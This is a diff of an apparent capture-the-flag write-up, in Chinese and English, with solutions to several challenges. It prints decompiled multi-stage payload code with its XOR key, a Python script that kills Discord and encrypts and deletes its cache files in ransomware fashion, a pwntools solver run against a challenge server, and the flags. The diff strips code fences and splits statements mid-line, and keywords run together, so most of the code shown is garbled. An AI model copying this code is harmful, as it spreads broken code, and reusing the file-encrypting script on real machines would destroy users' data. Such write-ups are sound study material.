@@ -269,11 +269,6 @@ ctf_testbench.vhd – 输入数据 din
 
 ```
 tcp.flags == 0x0018
-```
-
-
-
-```
 __int64 __fastcall main(int n3, char **a2, char **a3)
 {
 char *s1; // rbp
@@ -298,11 +293,6 @@ else
   }
 return0LL;
 }
-```
-
-
-
-```
 unsigned __int64 __fastcall sub_15D0(__int16 a1)
 {
 int fd; // eax
@@ -332,11 +322,6 @@ if ( fd < 0
   close(fd_2);
 return v6 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 unsigned __int64 __fastcall sub_16A0(char *cp, __int16 a2)
 {
 int fd_1; // eax
@@ -359,11 +344,6 @@ if ( fd_1 < 0
   close(fd);
 return v6 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 unsigned __int64 __fastcall sub_1420(int fd)
 {
   __int64 v1; // rbx
@@ -411,21 +391,17 @@ while ( 1 )
   perror("select");
 return v11 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
-LOAD:0000000000004010 ; _BYTE byte_4010[16]
-LOAD:0000000000004010 byte_4010       db 4, 7, 17h, 76h, 42h, 69h, 0B0h, 0Bh, 0DEh, 18h, 23h
-LOAD:0000000000004010                                         ; DATA XREF: LOAD:00000000000013FB↑o
-LOAD:0000000000004010                                         ; sub_1420+E↑o
-LOAD:000000000000401B                 db 22h, 1Eh, 0EDh, 0F7h, 0AEh
-```
-
-
-
-```
+LOAD:
+0000000000004010 ; _BYTE byte_4010[16]
+LOAD:
+0000000000004010 byte_4010       db 4, 7, 17h, 76h, 42h, 69h, 0B0h, 0Bh, 0DEh, 18h, 23h
+LOAD:
+0000000000004010                                         ; DATA XREF: LOAD:
+00000000000013FB↑o
+LOAD:
+0000000000004010                                         ; sub_1420+E↑o
+LOAD:
+000000000000401B                 db 22h, 1Eh, 0EDh, 0F7h, 0AEh
 # The 16-byte XOR key
 KEY = bytes.fromhex("040717764269B00BDE1823221EEDF7AE")
 
@@ -463,11 +439,6 @@ print("n--- Restored content of /tmp/supersecret ---")
 
 # Print the final result as a string
 print(total_decrypted_data.decode('utf-8'))
-```
-
-
-
-```
 --- Decrypting Data Chunks ---
 Chunk 1 decrypted (27 bytes)
 Chunk 2 decrypted (15 bytes)
@@ -486,17 +457,7 @@ These are some very sensitive notes so I want to be sure they're not exposed
 Anyway, here's my top secret information:
 cube{c00l_0p3r4t0rs_us3_mult1_st4g3_p4yl04ds_8ab49338}
 I hope nobody finds that...
-```
-
-
-
-```
 cube{c00l_0p3r4t0rs_us3_mult1_st4g3_p4yl04ds_8ab49338}
-```
-
-
-
-```
 import json
 import os
 from pathlib import Path
@@ -515,7 +476,8 @@ if __name__ == '__main__':
             print(f'Killing Discord (pid {proc.pid})')
             try:
                 proc.kill()
-            except psutil.NoSuchProcess:
+            
+except psutil.NoSuchProcess:
                 print('Process is already dead, ignoring')
     sentry_path = get_appdata_path() + 'Discord' + 'sentry' + 'scope_v3.json'
     with open(sentry_path, 'rb') as f:
@@ -535,7 +497,8 @@ if __name__ == '__main__':
         try:
             with open(file, 'rb') as fp1:
                 data = fp1.read()
-        except PermissionError:
+        
+except PermissionError:
                 print(f'Skipping {file} (file open)')
                 continue
             cipher = AES.new(key, AES.MODE_CBC, iv=iv)
@@ -544,11 +507,6 @@ if __name__ == '__main__':
             with open(file.with_suffix('.enc'), 'wb') as fp2:
                 fp2.write(ciphertext)
             file.unlink()
-```
-
-
-
-```
 import os
 from pathlib import Path
 from Cryptodome.Cipher import AES
@@ -640,7 +598,8 @@ for file_path in CACHE_PATH.glob('*.enc'):
         print(f"    -> [-] Removed {file_path.name}")
         decrypted_count += 1
 
-    except Exception as e:
+    
+except Exception as e:
         print(f"    -> [!] ERROR: Failed to decrypt {file_path.name}. Reason: {e}")
         failed_count += 1
     
@@ -652,11 +611,6 @@ for file_path in CACHE_PATH.glob('*.enc'):
 print("-" * 50)
 print("Decryption process finished.")
 print(f"Summary: {decrypted_count} files successfully decrypted, {failed_count} files failed.")
-```
-
-
-
-```
 import os
 from pathlib import Path
 
@@ -727,13 +681,15 @@ def get_file_type_and_ext(file_path):
                             return"WAV Audio", '.wav'
                         elif fourcc == b'AVI ':
                             return"AVI Video", '.avi'
-                        continue# Continue if it's a RIFF but not one we can specify
+                        continue
+# Continue if it's a RIFF but not one we can specify
 
                     returnf"{ext[1:].upper()} File", ext
 
             return"Unknown Binary", None
 
-    except IOError:
+    
+except IOError:
         return"Read Error", None
 
 def main():
@@ -779,7 +735,8 @@ def main():
                 print(f"  - Renamed:  {file_path.name:<30} -> {new_file_path.name} ({file_type})")
                 summary["renamed"] += 1
                 type_counts[file_type] = type_counts.get(file_type, 0) + 1
-            except OSError as e:
+            
+except OSError as e:
                 print(f"  - Error:    Could not rename {file_path.name}. Reason: {e}")
                 summary["error"] += 1
         else:
@@ -806,11 +763,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-
-
-```
 [*] Starting file identification and renaming in: Cache_Data
 
   - Unknown:  data_0                         (Type: Unknown Binary)
@@ -980,23 +932,8 @@ if __name__ == "__main__":
   - GZ File                  : 3 file(s)
   - MKV File                 : 2 file(s)
 ============================================================
-```
-
-
-
-```
 uscg{look_ma_i_deobfuscated_it}
-```
-
-
-
-```
 cube{-33.41,-70.61}
-```
-
-
-
-```
 │  summerinternproject.xpr
 │
 ├─summerinternproject.cache
@@ -1045,22 +982,12 @@ cube{-33.41,-70.61}
                 ctf.vhd
                 datapath_ctf.vhd
                 ram.vhd
-```
-
-
-
-```
 if rising_edge(clk) then
     dout <= RAM(to_integer(unsigned(addr))) AND "0000000011111111";
     if we = '1' then
         RAM(to_integer(unsigned(addr))) := din;
     end if;
 end if;
-```
-
-
-
-```
 constant test_data : input_array := (
     x"1275", x"D453", x"9E77", x"AA9B",  --3
     x"0167", x"8073", x"8972", x"C053", --7
@@ -1071,17 +998,14 @@ constant test_data : input_array := (
     x"C07F", x"1474", x"D474", x"B99D", --27
     x"E370", x"C361", x"A366", x"D07F" --31
 );
-```
-
-
-
-```
 def get_flag_from_din(din_values):
     """
     根据给定的din输入序列，模拟VHDL电路的行为来计算最终的flag。
 
-    :param din_values: 一个包含32个整数的列表，代表输入的din序列。
-    :return: 计算出的flag字符串。
+    :
+param din_values: 一个包含32个整数的列表，代表输入的din序列。
+    :
+return: 计算出的flag字符串。
     """
     if len(din_values) != 32:
         return"Error: din_values must contain exactly 32 numbers."
@@ -1113,13 +1037,17 @@ def get_flag_from_din(din_values):
         # 2e: 转换为字符
         try:
             flag_char = chr(result_ascii)
-        except ValueError:
+        
+except ValueError:
             flag_char = '?'# 如果结果不是有效的ASCII码，用'?'表示
             
         flag_chars.append(flag_char)
         
         # 打印每一步的中间结果
-        print(f"{i:2d}| {read_addr:9d} | 0x{ram_data:04x}         | 0x{masked_data:02x}           | {result_ascii:12d} | '{flag_char}'")
+        print(f"{i:2d}| {read_addr:9d} | 0x{ram_data:
+04x}         | 0x{masked_data:
+02x}           | {result_ascii:
+12d} | '{flag_char}'")
 
     # 步骤 2f: 拼接所有字符得到最终的flag
     final_flag = "".join(flag_chars)
@@ -1146,11 +1074,6 @@ flag = get_flag_from_din(din_values_from_testbench)
 print("n" + "=" * 60)
 print(f"The calculated flag is: {flag}")
 print("=" * 60)
-```
-
-
-
-```
 Simulating Read & Process Phase...
 ------------------------------------------------------------
 i | read_addr | ram_data (hex) | masked (hex) | result_ascii | char
@@ -1191,17 +1114,7 @@ i | read_addr | ram_data (hex) | masked (hex) | result_ascii | char
 ============================================================
 The calculated flag is: USCGCTF{FUN_P3RF3CT_G00D_AW3SUM}
 ============================================================
-```
-
-
-
-```
 USCGCTF{FUN_P3RF3CT_G00D_AW3SUM}
-```
-
-
-
-```
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
 constchar *s; // r13
@@ -1246,11 +1159,6 @@ if ( argc == 2 )
   __fprintf_chk(stderr, 2LL, "Usage: %s <flag>n", *argv);
 return1;
 }
-```
-
-
-
-```
 #!/usr/bin/env python3
 from pwn import *
 from collections import Counter
@@ -1288,7 +1196,8 @@ try:
         if flag_len <= 0: raise Exception(f"计算出的Flag长度不合法: {flag_len}")
         log.success(f"成功确定 Flag 长度为: {flag_len}")
 
-    except Exception as e:
+    
+except Exception as e:
         log.error(f"确定Flag长度时出错: {e}")
         if p: p.close()
         exit(1)
@@ -1310,7 +1219,8 @@ try:
             whileTrue:
                 r_index = buffer.find(b'r')
                 if r_index == -1or len(buffer) < r_index + 1 + flag_len:
-                    break# 如果找不到'r'或数据不完整，则等待更多数据
+                    break
+# 如果找不到'r'或数据不完整，则等待更多数据
 
                 line = buffer[r_index + 1 : r_index + 1 + flag_len].decode(errors='ignore')
                 
@@ -1323,10 +1233,12 @@ try:
                 # 从buffer中移除已处理的数据
                 buffer = buffer[r_index + 1:]
 
-        except EOFError:
+        
+except EOFError:
             log.warning("连接在收集数据时关闭。")
             break
-        except Exception:
+        
+except Exception:
             pass
 
     prog.success(f"数据收集完成，共 {rounds} 轮。")
@@ -1363,14 +1275,10 @@ try:
 finally:
     if p:
         p.close()
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/桌面]
 └─$ python exp.py
-[*] 连接到 incantation.chal.cubectf.com:5757...
+[*] 连接到 incantation.chal.cubectf.com:
+5757...
 [+] Opening connection to incantation.chal.cubectf.com on port 5757: Done
 [*] 正在动态确定 Flag 长度...
 [+] 成功确定 Flag 长度为: 40
@@ -1424,11 +1332,6 @@ finally:
 ----------------------------------------
 [+] 分析完成！Flag: cube{4br4c4d4br4_sh3z4m_pr3st0_98f814ff}
 [*] Closed connection to incantation.chal.cubectf.com port 5757
-```
-
-
-
-```
 cube{4br4c4d4br4_sh3z4m_pr3st0_98f814ff}
 ```
 
